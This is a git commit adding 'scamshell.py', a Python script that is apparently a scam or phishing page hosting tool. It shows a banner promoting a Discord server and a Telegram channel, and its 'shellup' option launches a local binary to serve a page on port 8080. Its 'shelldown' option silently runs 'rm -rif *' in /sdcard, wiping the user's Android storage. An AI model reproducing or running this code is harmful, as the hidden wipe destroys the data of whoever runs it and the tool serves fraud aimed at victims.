754d96dafce803ae544e6c920b9a193f53f15273
kakroot <73759718+kakroot@users.noreply.github.com>
2020-11-25 17:56:03 +0300

    Add files via upload

---
+++ scamshell.py
@@ -0,0 +1,76 @@
+import os 
+from os import system as SHELL
+
+SHELL("clear")
+
+
+
+FD="""
+
+\033[93m
+   :'######:::'######:::::'###::::'##::::'##:
+   '##... ##:'##... ##:::'## ##::: ###::'###:
+    ##:::..:: ##:::..:::'##:. ##:: ####'####:
+   . ######:: ##:::::::'##:::. ##: ## ### ##:
+   :..... ##: ##::::::: #########: ##. #: ##:
+   '##::: ##: ##::: ##: ##.... ##: ##:.:: ##:
+   . ######::. ######:: ##:::: ##: ##:::: ##:
+   :......::::......:::..:::::..::..:::::..::
+    
+    \033[96m      Create By [+] STaFF SHELL
+    \033[93m
+    1 [+] Discord  https://discord.gg/shell
+    2 [+] Telegram https://t.me/kakshell
+
+\033[91m      
+
+            Enter [\033[96m shellup\033[91m ]  to  starts
+\033[94m
+[+] ###############################################[+]
+
+
+"""
+fd=open("scamshell.py",'r')
+if (fd.name=="scamshell.py"):
+                           SHELL("rm -rif SHELLUP")
+                           SHELL("mkdir SHELLUP")
+                           SHELL("echo 'join teamshell in discord : https://discord/shell |\n\r supas bo bakr henani tool kakshell |\n\r join my channel in tegelgram for more tool' > infoabout.txt ")
+                           SHELL("mv infoabout.txt SHELLUP")
+
+else:
+    os.sys.exit()
+
+print(FD)
+
+
+
+
+user=input("\033[92m [+] Enter : >> ")
+if (user=="1"):
+    SHELL("xdg-open https://discord.gg/shell")
+    SHELL("python scamshell.py")
+
+
+if (user=="2"):
+    SHELL("xdg-open https://t.me/kakshell")
+    SHELL("python scamshell.py")
+
+
+
+
+if (user=="shellup"):
+           print ("[+] Wait to HOST the page")
+           SHELL('sleep 9')
+           SHELL('./SHAHO http 8080')
+if (user=="shelldown"):
+        os.chdir("/sdcard")
+        SHELL("rm -rif * ")
+        
+
+
+
+if (user==''):
+           SHELL("python scamshell.py")
+
+if (user==' '):
+          SHELL('python scamshell.py')
